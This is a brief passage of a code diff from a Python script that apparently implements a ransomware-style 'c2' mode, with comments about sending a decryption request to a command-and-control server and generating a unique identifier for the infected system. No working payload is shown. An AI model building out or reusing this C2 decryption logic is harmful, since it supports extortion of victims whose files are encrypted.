@@ -54,7 +54,6 @@ if __name__ == "__main__":
         import subprocess
         subprocess.run([sys.executable, '-m', 'pip', 'install', "--user",'cryptography'])
 
-    # TODO: handle c2 mode
     if data["mode"] == "c2":
         # Send Decryption request to C2.
         # A good way to identify the system is to create a unique identifier 
